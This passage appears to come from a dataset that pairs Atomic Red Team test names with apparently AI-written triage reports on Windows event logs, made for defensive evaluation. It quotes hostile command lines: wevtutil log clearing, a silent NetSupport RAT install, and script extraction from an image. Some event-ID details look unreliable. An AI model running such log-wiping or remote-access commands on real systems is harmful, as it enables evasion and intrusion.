3. **Remediation**: Remove the port proxy configurations, reset affected accounts, and restore altered security configurations.
4. **Monitoring Enhancement**: Deploy enhanced monitoring for early detection of similar activities and ensure that log clearing is restricted and monitored."
Download a file with Microsoft Connection Manager Auto-Download,"Based on the analysis of the provided event logs, the following observations have been made:

1. **Usage of Wevtutil.exe:**
   - There are multiple instances of `wevtutil.exe` being used to clear various event logs (Sysmon, Application, System, Security, Windows PowerShell) by the user `SERVER002\admin_test`. The command line arguments used, such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, etc., directly indicate the clearing of logs.

2. **Cleared Event Logs:**
   - The event logs such as System (`EventID 104`), Security (`EventID 1102`), and Windows PowerShell have records indicating the event logs were cleared, which is unusual and often associated with malicious activity attempting to cover tracks.

3. **Executing Scripts and System Utilities:**
   - Execution of potentially suspicious command-line instructions from the `cmd.exe` involving paths such as `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1105\src\T1105.bat`. The presence of ""AtomicRedTeam"" could point to a security exercise or misuse of known red team tools for malicious purposes.
   - Execution of `powershell.exe` without specific command-line arguments logged can also be a red flag when analyzed with other factors.

4. **Persistence Techniques?**
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` with varying commands, though they are typical for maintaining updated software, the timing and execution by `SYSTEM` could suggest automated tasks – this is not immediately linked to malicious behavior but warrants consideration if other risks are present.

5. **Anomalous User Activity:**
   - The `admin_test` account appears to have elevated permissions, executing a series of administrative commands, including clearing crucial system logs. This behavior is highly suspicious.

**Assessment:**
Given the evidence of logs being cleared by an administrative user, combined with potentially suspicious process executions, there are strong indicators of either malicious activity or a poorly documented internal security exercise. The actions taken by the `admin_test` account resemble typical steps taking in covering malicious activities. The fact that some batch and executable files within paths suggest testing setups (e.g., ""AtomicRedTeam"") also introduces a level of suspicion, particularly if this is not normal behavior within the organization's operations.

**Resolution:**
- **MALICIOUS**: The activity is highly indicative of attempts to cover tracks following potentially malicious behavior, especially with log-clearing activities across critical logs. Immediate action should be taken to secure the environment, including revoking use/powers of the `admin_test` account, conducting a thorough investigation of this user's activities, and considering forensic analysis to understand the full scope and impact of the activities."
NetSupport - RAT Execution,"Upon analyzing the provided logs for the Windows host, several suspicious activities stand out that may indicate potential malicious activity on the system. I'll break down the findings:

### 1. **Event Log Clearing (Security Log EventID 1102):**
   - **EventID 1102 from the security log indicates that the audit logs were cleared.** This is a significant red flag as it is a common technique used by attackers to cover their tracks after a compromise. The event is associated with the user ""admin_test,"" which may suggest internal misuse or an account compromise.
   
### 2. **Use of `wevtutil.exe` (Sysmon Log EventID 1 & 5):**
   - There's evidence of the `wevtutil.exe` utility being used to clear various event logs (Sysmon/Operational, Application, Security, and System). The command lines confirm the intent to clear logs, and these actions are executed by the user ""admin_test.""
   - `wevtutil.exe` is a legitimate utility for managing event logs, but its use in this context complements the log-clearing activities and adds to suspicious activities.

### 3. **PowerShell Execution:**
   - The logs capture a PowerShell process executing with the following command:
     ```plaintext
     powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1219_NetSupport.exe\"" -ArgumentList \""/S /v/qn\""}
     ```
   - This action is highly suspicious as it involves invoking a potentially unauthorized executable (`T1219_NetSupport.exe`) from a temporary path, which is often associated with malicious payload delivery and execution. The use of administrative-level privileges (`admin_test`) to execute this command further raises the suspicion.

### 4. **NetSupport Manager Installation Attempt:**
   - Multiple events in the logs show attempts to install `NetSupport Manager`, a legitimate remote administration tool, but often associated with remote access trojan activities when installed without authorization.
   - The installation attempt fails, as highlighted by the MsiInstaller log (EventID 11708), reporting the failure of the installation operation.

### 5. **Service and Process Executions related to EdgeUpdate:**
   - Activities related to Microsoft EdgeUpdate are noted. These appear benign and related to update actions, based on the observed processes and command-line arguments.

### Conclusion:
Based on the analysis, the following resolution is provided:

- **Resolution: MALICIOUS**
  - The combination of event log clearance, usage of system utilities like `wevtutil.exe` for log manipulation, suspicious PowerShell execution invoking a binary from an abnormal path, and the unauthorized attempt to install a potentially unwanted application (NetSupport Manager) point towards a concerted effort potentially orchestrated to compromise and maintain unauthorized control over the host system.
  
### Guidance:
- **Immediate Actions:**
  - Temporarily isolate the affected host from the network to prevent further spread or exfiltration.
  - Conduct a comprehensive review of user account activities, particularly focusing on ""admin_test.""
  - Initiate a forensic investigation to capture memory, disk images, and further analyze any suspicious binaries and network activity.
  - Assess the need for password changes and enhanced monitoring for similar activities across the network.

- **Long-Term Actions:**
  - Reinforce security configurations, particularly logging and monitoring, to detect similar attempts early.
  - Educate staff on security best practices, focusing on privileges and account management.
  - Implement and enforce application whitelisting to detect and block similar unauthorized software installations.

These actions aim to address the immediate threat and bolster defenses against future incidents."
RustDesk Files Detected Test on Windows,"Detailed analysis of the logs indicates a mix of standard and suspicious activities:

1. **Log File Clearing**:
   - Multiple instances of log file clearing using `wevtutil.exe` are present:
     - Clearing the System, Application, Security, and Windows PowerShell logs. This activity typically suggests an attempt to erase evidence or traces of prior actions.

2. **RustDesk Installation via PowerShell**:
   - Event logs show a PowerShell command executed by an admin user (`SERVER002\admin_test`) to download and execute the RustDesk software silently:
     - `Invoke-WebRequest` to download RustDesk and `Start-Process` to silently install it. This could indicate unauthorized software installation, especially if not part of routine processes.

3. **Use of whoami.exe**:
   - Execution of `whoami.exe` by `admin_test`. While `whoami.exe` by itself isn't inherently malicious, if used in a script that further downloads and executes other programs, it could serve as a tool to understand the executing user's permissions.

4. **Taskkill Execution**:
   - Use of `taskkill.exe` to terminate specific processes (`RuntimeBroker_rustdesk.exe`), indicating possible post-installation actions to handle conflicts with existing processes.

5. **Various System and Security Processes**:
   - Regular updates and executions from Microsoft Edge Update service and system services (`svchost.exe`, `SearchIndexer.exe`), which are generally standard within a Windows environment unless seen blocking or altering expected system behavior.

6. **Elevation Events**:
   - Several instances of privilege escalation (EventID: 4672) where SYSTEM privileges were assigned. Expected for internal Windows processes, but monitoring should ensure these actions align with known behaviors or software.

**Assessment of the Situation**:

Events indicating the manual clearing of logs, combined with unauthorized downloads and silent installations via PowerShell by an administrative user, align with tactics commonly used in malicious activities. The presence of software installation without prior authorization and the frequency of specific privileged activities raise concerns of potential system compromise.

**Identified Threats/Risks**:
- Potential exposure to malicious or unauthorized software through silent installations.
- Potential evasion attempts from log clearing, eliminating traces of possibly previous unauthorized actions.

**Guidance on How to Proceed**:
- Investigate the necessity and legitimacy of the RustDesk installation. Ensure it's authorized and part of accepted software inventory.
- Conduct a thorough review of `admin_test` activities and verify credentials for proper use.
- Review processes associated with the IP addresses and time stamps to identify potential lateral movements.
- Increase monitoring and audit settings for privilege use, especially focusing on accounts capable of manipulating system logs.

**Resolution**: MALICIOUS - The logs indicate unauthorized software installation, and log clearance likely intended to hide potentially malicious actions. Further investigation and response are required to determine the extent and impact."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"Upon reviewing the provided logs from the Windows machine (Server002), several suspicious and potentially malicious activities have been identified. These findings are based on known suspicious patterns and behaviors observed in the logs:

### Suspicious and Potentially Malicious Activity:

1. **Event Log Clearing**:
   - Logs indicate that an account named `admin_test` cleared multiple event logs (Security, System, Application, and Windows PowerShell) using `wevtutil` command-line utility. Clearing of logs is a significant indicator of suspicious activity as it is commonly done by attackers to cover their tracks and avoid detection.
   
   - Example entry: 
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - `""User"":""SERVER002\\admin_test""`

2. **Suspicious PowerShell Activity**:
   - There are PowerShell events where a script is being extracted from an image file (`evil_kitten.jpg`) through the use of a PowerShell module (`Extract-Invoke-PSImage.ps1`). This behavior indicates the use of steganography, a technique often used by attackers to obfuscate malicious scripts within image files.
   
   - Example command:
     - `powershell.exe & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\ExternalPayloads\\"" Import-Module .\\Extract-Invoke-PSImage.ps1 $extractedScript=Extract-Invoke-PSImage -Image ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1001.002\\bin\\evil_kitten.jpg"" -Out ""$HOME\\result.ps1""}`

3. **Usage of Known Attack Simulation Tools**:
   - The use of `AtomicRedTeam`, which is known for simulating attacker techniques, suggests that the activity is mimicking real-world adversarial behavior potentially used to test defenses or conduct red team exercises. However, if it is not part of an authorized red team activity, it mirrors potential malicious behavior.

### Assessment:
Based on the evidence outlined above, the logs show clear signs of potentially malicious activity. Events such as event log clearing, the execution of PowerShell scripts involving steganographic extraction, and the involvement of `AtomicRedTeam` tools strongly indicate a security incident.

### Resolution:
- **MALICIOUS**: The activity logged is consistent with known malicious behaviors and techniques typically associated with an active compromise or testing using attack simulation tools without authorization.

### Recommendations:
1. **Immediate Incident Response**:
   - Isolate the affected host (Server002) to prevent further potential damage or lateral movement within the network.

2. **Thorough Investigation**:
   - Conduct a detailed forensic analysis of Server002 to determine the scope and impact of the compromise.
   - Review related systems for similar indicators of compromise.

3. **Check for Internal Coordination**:
   - Verify whether there are any ongoing authorized red teaming exercises that could explain these activities. If not authorized, escalate as a security incident.

4. **Implement Monitoring**:
   - Enhance monitoring around PowerShell script execution and event log modifications.

5. **Security Awareness**:
   - Educate users about the risks associated with suspicious administrative logons and the importance of reporting them.

Proceeding with these actions will help in mitigating the risk and understanding the full extent of the compromise, allowing appropriate remediation measures to be put in place."
Download a file using wscript,"### Analysis of Logs

#### Suspicious and Anomalous Events:

1. **Cleared Event Logs**:
   - **Event ID 104 (System)** and **Event ID 1102 (Security)** indicate that logs have been cleared by the user `admin_test`. Clearing event logs can be a method used by attackers to cover their tracks after malicious activities.
   - The `wevtutil.exe` utility is executed to clear the logs in these cases, which is consistent with deliberate action to hide activity.

2. **Unauthorized and Suspicious PowerShell Execution**:
   - Multiple PowerShell and related processes (e.g., `conhost.exe`) executed under `admin_test` with high integrity level around the same time the logs were cleared (e.g., Sysmon Event ID 5 showing PowerShell related activity). These processes are often leveraged in malicious scripts or during lateral movements.
   
3. **Potential Malicious Script Execution**:
   - The use of `cmd.exe` to execute a VBScript (`T1105-download-file.vbs`) via `wscript.exe` is noted. This is suspicious as the file resides in a user’s Temp directory, indicating potential malicious activity exploiting Tactics, Techniques, and Procedures (TTP), specifically T1105 (Ingress Tool Transfer) as per MITRE ATT&CK framework.

4. **System Compromise Indicators**:
   - The execution of the `whoami.exe` command indicates enumeration of user privileges, which could be a precursor to privilege escalation attempts.
   - Regular updates and installations, such as those seen with Microsoft Edge, were also noted. However, the pattern and timing raise concern as they coincide with log clearing and script execution.

#### Assessment and Threats Identified:

- The combination of log clearing, execution of suspicious scripts (VBScript with potential malware behavior), and PowerShell activity indicates probable unauthorized access or malicious activity on the host.
- Activities often used to obfuscate actions (log clearing, transient script execution, and system/user enumeration) suggest an attempt to establish persistence or further compromise the system.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation**:
   - Isolate the affected host (Server002) from the network to contain the threat and prevent lateral movement or further data exfiltration.

2. **Forensic Investigation**:
   - Conduct a thorough forensic investigation to ascertain the extent of compromise, identify the origin, and evaluate any potential data loss.
   
3. **Review and Strengthen Security Posture**:
   - Review and enhance logging capabilities to ensure logging cannot be easily disabled or cleared in the future (e.g., auditing configuration).
   - Implement stricter controls and monitoring on PowerShell and script execution via Group Policies or endpoint security solutions.

4. **User Account Review**:
   - Review the `admin_test` account for any anomalies in activity, unauthorized permissions, and consider reverting all passwords and session tokens.

5. **Patch and Update Systems**:
   - Ensure all systems and applications are updated with the latest security patches to reduce exploitability. 

6. **Alert and Monitoring**:
   - Implement continuous monitoring and alerting for any similar behavior across the network or endpoints.

It is crucial to take these steps promptly to restore the security of your systems and data integrity."
Malicious User Agents - CMD,"After a thorough analysis of the provided log entries, there are several key observations and potential indicators of suspicious or malicious activity:

1. **Event Log Clearing**:
   - The event logs for the `Security`, `System`, and `Windows PowerShell` channels were cleared as indicated by the presence of Event ID 1102 in the Security log and Event ID 104 in the System log, both performed by the user `admin_test`. Clearing logs is a common tactic used by attackers to cover their tracks.

2. **Suspicious Process Executions**:
   - Multiple instances of `wevtutil.exe` were executed with the `cl` argument (e.g., for clearing logs) by the user `admin_test` right before the logs were cleared. This strongly suggests an attempt to hide activity. 
   - The use of PowerShell (e.g., `WindowsPowerShell.exe`) with the `admin_test` account also accompanies these activities and could point towards script-based automation or obfuscation attempts.

3. **Browser User-Agent Manipulation with `curl.exe`**:
   - Commands involving `cmd.exe` and `curl.exe` were observed with atypical User-Agent strings aimed at accessing `www.google.com`. This may signify reconnaissance or data exfiltration attempts by mimicking legitimate browser traffic.

Considering these findings, the clearing of event logs by an administrative user in conjunction with the execution of processes such as `wevtutil.exe` and `curl.exe` with unconventional arguments points strongly towards an indication of compromise.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately initiate an incident response process. Preserve any other logs that have not been manipulated.
- Conduct a full forensic analysis of `Server002` to determine the entry point and scope of the compromise.
- Reset and secure the administrative accounts, especially `admin_test`.
- Strengthen monitoring and implement alerts for unusual activities such as log clearing and process executions with atypical command lines.
- Consider deploying endpoint detection and response (EDR) solutions to better detect and respond to future malicious activities."
Windows - PowerShell Download,"Based on the analysis of the provided Windows event logs, the following observations stand out:

1. **Log Clearing:**
   - There are multiple events indicating the clearing of event logs (Event ID 1102 in the Security log and Event ID 104 in the System log). The logs were cleared by the user ""admin_test"" on ""Server002"" using the `wevtutil.exe` command line utility across various channels, including Security, System, and Windows PowerShell. Clearing logs is often an action taken by malicious actors to cover their tracks and should be considered highly suspicious.

2. **PowerShell Usage:**
   - There are entries in the PowerShell logs showing the execution of a PowerShell command to download a file (""LICENSE.txt"") from an external URL using the WebClient method. The PowerShell execution was performed by ""admin_test"" on ""Server002."" While downloading a file via PowerShell is not inherently malicious, this activity should be scrutinized further, especially in conjunction with the log clearing.

3. **Sysmon Log Observations:**
   - Several instances of `wevtutil.exe` being used to clear logs are recorded in the Sysmon logs. The ""admin_test"" account exhibits high privilege levels (IntegrityLevel=""High"") while executing these commands, adding to the suspicious context of this behavior.

4. **Microsoft Edge Update Activity:**
   - The logs include several routine Microsoft Edge Update processes, but given the context of log clearing and suspicious PowerShell activity, these should be cross-verified to ensure that they were legitimate updates.

**Assessment and Resolution:**
- **SUSPICIOUS:** The main concerns are the clearing of logs and the PowerShell activity involving external file downloads, both performed around the same time. Clearing logs is a critical indicator of potential malicious activity as it is often used to cover up unauthorized or harmful actions. The PowerShell command, while not inherently malicious, coupled with the timing and log clearing, enhances the suspicion of misuse or compromise.

**Guidance on How to Proceed:**
- Perform a thorough investigation on the user ""admin_test"" to determine if this activity aligns with their normal behavior or if their account may be compromised.
- Verify the downloaded file to ensure it does not contain malicious content.
- Investigate the context and legitimacy of the Microsoft Edge update activities.
- Consider implementing additional monitoring tools or measures to track similar behaviors in the future.
- Check for additional indicators of compromise on the host system, such as network connections or persistence mechanisms related to the identified suspicious activity.
- Review security policies and practices related to administrative access and PowerShell execution to prevent unauthorized use."
DNS over HTTPS Long Domain Query,"Upon analyzing the provided Windows event logs, several suspicious activities stand out that could indicate potential malicious actions on the host. Here's a detailed analysis:

### Observations and Analysis:

1. **Event Log Clearing:**
   - In the security log (EventID 1102), we observe that the event logs were cleared by the user ""admin_test"" on ""Server002"" at ""2024-10-28 15:19:54."" This action is often associated with attempts to cover up malicious activity by removing traces of actions logged within the event logs.

2. **Usage of `wevtutil.exe`:**
   - The Sysmon logs show several invocations of `wevtutil.exe` (EventID 1) being used to clear different event logs like ""Security,"" ""System,"" and ""Windows PowerShell."" `wevtutil.exe` is a legitimate utility for managing logs, but its use in this manner shortly before logs are cleared can be a strong indicator of malicious intent, specifically to obfuscate malicious activities.

3. **Execution of a PowerShell Script:**
   - The Windows PowerShell log indicates the execution of a PowerShell script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1572\src\T1572-doh-domain-length.ps1`. This script seems to involve domain name system (DNS) tunneling techniques using `doh-server` (DNS over HTTPS server) to potentially exfiltrate data or perform other unauthorized network communications.
   - The script originated from a path associated with ""Atomic Red Team,"" known for being a security testing framework meant for simulating adversary tactics. While this might suggest a security assessment, the context and actions like log clearing make it suspicious.

4. **Privilege Escalation Concerns:**
   - The user ""SERVER002\admin_test"" is executing actions with a high-integrity level, which could indicate administrative privileges. This enhances the risk associated with the observed actions since an attacker with administrative privileges could perform significant alterations or damage.

### Threats or Risks Identified:
- The combination of log clearing, suspicious script execution, and the high privilege level constitutes a potentially serious threat. This behavior aligns with typical tactics used to achieve stealth and persistence by advanced persistent threats (APT) or other sophisticated attackers.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - **Isolate the Host:** Disconnect or quarantine ""Server002"" from the network to prevent further potential compromise or data exfiltration.
   - **User Account Review:** Investigate the usage and access patterns of the ""admin_test"" account, as it may be compromised.

2. **Forensic Analysis:**
   - Conduct a deeper forensic analysis to identify the full scope of activities undertaken by the PowerShell script.
   - Verify the integrity of other systems in the network for signs of similar compromise or policy violation.

3. **Review Security Policies:**
   - Reinforce logging policies and investigate alternative solutions to prevent unauthorized log clearing.
   - Implement security monitoring solutions to detect and alert on suspicious behaviors including the use of administrative tools like `wevtutil.exe`.

4. **Determine Intent:**
   - Consult with internal teams or stakeholders to determine if this activity was authorized (e.g., part of a penetration test). Lack of formal acknowledgment should reinforce the suspicion.

### Final Resolution:
- **MALICIOUS:** The logs contain activities that strongly suggest deliberate evasive and potentially harmful actions, consistent with malicious activity. Further investigation and immediate containment are advised."
DNS C2,"### Detailed Analysis of Logs

1. **Log Cleared Events:**
   - **Security Event ID 1102** and **System Event ID 104** correspond to ""The event log was cleared."" The Security log was cleared by a user with UserID `admin_test`. The clearing of logs, especially security logs, is highly suspicious behavior indicative of someone attempting to erase tracks of potential unauthorized actions or breaches.

2. **Time Manipulation Events:**
   - **Security Event ID 4616** shows ""System time was changed"" events. The system time being changed is usually benign, often related to synchronization purposes. However, if combined with other suspicious indicators like log clearing, it can be indicative of an attacker trying to cover tracks or manipulate timestamps for malicious activity.

3. **PowerShell Execution:**
   - The **Windows PowerShell logs** contain events with the download and execution of a script from a known suspicious URL (`dnscat2-powershell`). This script is a known tool used for covert communication, indicating a compromise.
   - **PowerShell Event IDs 600 and 800** indicate script execution, particularly scripts labeled as potentially malicious (dnscat tool).

4. **Sysmon Logs - Malicious Process Execution:**
   - **Sysmon Event ID 1** entries show execution of `wevtutil.exe` to clear application, system, and security logs. This utility is often used in attacks to hide malicious activity by clearing logs.

5. **Use of Compilers and Assemblers:**
   - The presence of C# compiler (`csc.exe`) in the **Sysmon Event IDs 17992 and 17993** is another red flag. Such a compiler is typically not invoked frequently on a server, which might suggest compiling malicious code or payloads.

6. **Unexpected Network Connections:**
   - **Sysmon Logs** include the execution of `nslookup.exe` without clear context, which could imply DNS-based reconnaissance or tunneling by malicious actors.

### Assessment

- The combination of log clearing commands, PowerShell script execution from a known malicious URL, system time changes, and the use of command-line utilities associated with evasion techniques strongly suggests a targeted, successful compromise of the system. The logs exhibit signs of a threat actor attempting to maintain persistence and cover tracks post-compromise, indicative of a skilled attacker.

### Threats or Risks Identified

- Potential data exfiltration or espionage activities due to command and control operations using the dnscat2 tool.
- The system may have unauthorized backdoor access, potentially compromising sensitive data or organizational integrity.
- Possible lateral movement within the network, considering the utilities and scripts executed.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Quarantine the affected host to prevent further unauthorized access or damage.
   - Collect memory images and other volatile data for further forensic analysis.
   - Consider deploying endpoint detection and response (EDR) tools to capture ongoing events.

2. **Investigation:**
   - Conduct a thorough review of all script executions, scheduled tasks, and newly created accounts on the system.
   - Compare file hashes of critical system binaries with known good hashes from a trusted source.

3. **Remediation:**
   - Restore the system from a known good backup, after ensuring the backup is clean.
   - Implement enhanced monitoring and logging post-incident recovery to detect any further suspicious activities quickly.
   - Review and update firewall rules, access control configurations, and endpoint security to mitigate against similar attacks.

4. **Awareness & Training:**
   - Conduct security training for staff focusing on recognizing phishing and social engineering tactics.
   - Review and improve incident response and disaster recovery plans based on lessons learned.

### Final Resolution: MALICIOUS

The observed activities, including log clearing, suspicious script execution, and system manipulation, provide concrete evidence of malicious compromise on the examined system. Immediate containment and comprehensive forensic investigation are crucial to remediate the incident and prevent future occurrences."
Telnet C2,"Based on the provided Windows event logs, here is the detailed analysis and assessment:

1. **PowerShell Activity:**
   - PowerShell logs indicate the execution of a command using `telnet_client.exe` with `PowerShell` being invoked to run it. The use of telnet client in a PowerShell script to connect to `127.0.0.1` on port `23` is suspicious as telnet is not commonly used in modern secure environments due to its unsecured nature. It's often seen in test tools or during penetration testing exercises.

2. **Sysmon Events:**
   - Multiple instances of `wevtutil.exe` are being executed. This utility is primarily used to manage event logs, including clearing logs, which can be indicative of malicious activity if done without proper justification.
   - The execution of `whoami.exe` and `hostname.exe` is noted. While these commands can be used benignly to verify logged-in user information and machine name, they can also be employed by attackers post-compromise to identify the user's privileges and system details.

3. **Logs Being Cleared:**
   - The Security and System logs indicate that the logs were cleared by the user `admin_test`. Clearing logs is a common tactic used by malicious actors to cover their tracks and makes it difficult to investigate incidents.

4. **Use of Microsoft EdgeUpdate:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` related to updating and installing Microsoft Edge. The presence of this activity might be legitimate if it coincides with scheduled updates, but could be suspicious if these updates are not expected or authorized.

Considering the combination of unusual PowerShell use, frequent execution of event log management, and clearing of logs, the evidence leans towards activities that do not appear regular and may suggest potential compromise. However, some indicators might represent legitimate testing or system management activities if properly authorized and documented.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough review of the user `admin_test` activities and privileges.
- Verify the legitimacy and necessity of the telnet usage and the specific context or testing activities were authorized for `admin_test`.
- Review other systems to ensure that these activities are limited to this host and haven’t expanded to others in the environment.
- Examine security policies and monitoring tools to improve detection and response to similar events in future.
- Consider implementing stricter access controls and logging mechanisms to prevent unauthorized clearing of logs.
- Engage the relevant teams to ascertain if the Edge update was scheduled and legitimate, or if the binaries have been tampered with."
Malicious User Agents - Powershell,"Based on the provided log entries and my assessment, here are the observations and interpretations of potential threats or risks:

### Analysis:

- **Event Log Clearing:**
  - **Security and System Event 1102:**
    - Logs indicate that both System and Security event logs were cleared (`wevtutil.exe cl <log_name>` command lines observed). 
    - The user responsible appears to be `admin_test` with a high integrity level.
    - Event clearing without a documented reason, especially by an account named `admin_test`, is suspicious, as adversaries often clear logs to cover their tracks.

- **PowerShell Activity:**
  - Multiple PowerShell commands using `Invoke-WebRequest` to `www.google.com` with various user agents are executed in rapid succession.
  - The action lacks a clear legitimate purpose and such scripts could be part of a broader reconnaissance or testing attempt, especially with unconventional user agents.

- **EdgeUpdate and Setup Executables:**
  - Multiple executions of `EdgeUpdate\Install\setup.exe` related to Microsoft Edge processes.
  - While these seem like legitimate updates, their timing coinciding with the log clearing operations merits further investigation, especially if updates were not scheduled or expected.
  - Command-line arguments used seem consistent with normal Edge updater functionalities, yet their association with other suspicious activities requires correlation with IT patching schedules.

- **System Process Executions:**
  - Routine executions of system utilities like `hostname.exe` and `whoami.exe` observed.
  - While these by themselves are not inherently suspicious, taken with context of log clearings and PowerShell activity, they may form part of a reconnaissance phase (to establish execution environment and current privileges).

### Threat Assessment:

Given the combination of these events—log clearing by an admin, unusual PowerShell activity, and Edge setup processes—the activity is assessed as suspicious but not definitively malicious based on logs alone.

### Conclusion:

- The logs point to **SUSPICIOUS** activity, primarily due to the event log clearing and unusual PowerShell usage.
- Recommend further investigation:
  - Verify if `admin_test` had legitimate reasons or authorizations to clear logs.
  - Inspect other network activity from the host during this period for anomalous connections or data exfiltration attempts.
  - Check with IT/DevOps for any logged or scheduled updates related to Edge, and review MDM/patching policies in place.

### Guidance:

- Suspend account `admin_test` and monitor for additional unauthorized log clearings or PowerShell executions.
- Enhance logging policies to alert for log-clearing actions or unsanctioned PowerShell commands.
- Consider endpoint threat detection focusing on script abuse to preemptively catch similar occurrences.

By following through these steps and corroborating system logs with network behaviors, we can aim to determine whether this was an overzealous internal action or a sophisticated intrusion attempt."
File Download via PowerShell,"Upon reviewing the provided Windows event logs, I have analyzed activities across several log types such as Application, Security, Windows PowerShell, System, and Sysmon logs. Below is a detailed analysis:

### Suspicious and Potentially Malicious Activities:

1. **Log File Clearing Events:**

   - **Security Log (EventID: 1102)** and **System Log (EventID: 104):** Both indicate a log clearing event performed by an account named ""admin_test."" This action implies that an individual with administrative privileges has cleared the event logs, which is often done to cover tracks of potentially malicious activities. Frequent or unexpected log clearing can be an indicator of malicious activity, aiming to destroy evidence.

2. **PowerShell Activity:**

   - There are several events from PowerShell logs where a command was executed to download content from a URL using PowerShell and save it as ""LICENSE.txt"". This script was executed with high integrity level privileges, and involves use of `Net.WebClient` to fetch a file from a remote repository, followed by opening it with `Invoke-Item`. This kind of activity is normally suspicious because PowerShell is frequently used in payload delivery in attacks, and downloading and executing files directly from the internet can be associated with malware delivery or reconnaissance scripts.

3. **Time Manipulation Events:**

   - **Security Log (EventID: 4616)**: The time on the system was manipulated, as indicated by the NewTime and OldTime in the logs. Time manipulation can be used in attempts to confuse logs or as part of anti-forensic techniques.

4. **Sysmon Log Events:**

   - The presence of whoami.exe, wevtutil.exe, and powershell.exe being executed with high integrity suggests potential reconnaissance activity and evidence deletion. Processes like `whoami` and `hostname` are commonly used to understand the context in which a script runs, and clearing event logs via `wevtutil` signifies efforts to evade detection.

### Conclusion:

The combination of these activities — especially the log clearing, PowerShell download from an external URL, and use of utilities for potential reconnaissance or cleanup — are indicative of suspicious behavior. 

### Resolution:

**SUSPICIOUS**

### Further Actions:

1. **Investigate the ""admin_test"" User:**
   - Check for any unauthorized access or anomalies related to this account, considering the log clearance and other admin-level actions were performed.

2. **Conduct a Network Traffic Analysis:**
   - Correlate these logs with network logs to examine any outgoing connections or unusual data transfers, especially around the time of the PowerShell executions.

3. **Verify File Integrity:**
   - Scan for any unauthorized or unfamiliar files, including the downloaded LICENSE.txt, using updated antivirus and malware detection tools.

4. **Review System Integrity and Additional Logs:**
   - Ensure no further tampering has taken place. System integrity checks on core executables and configuration might provide insights into any further compromised areas.

5. **Close Security Gaps:**
   - Consider implementing stricter logging policies and user activity monitoring to thwart potential attacks and ensure quick detection in case of future incidents."
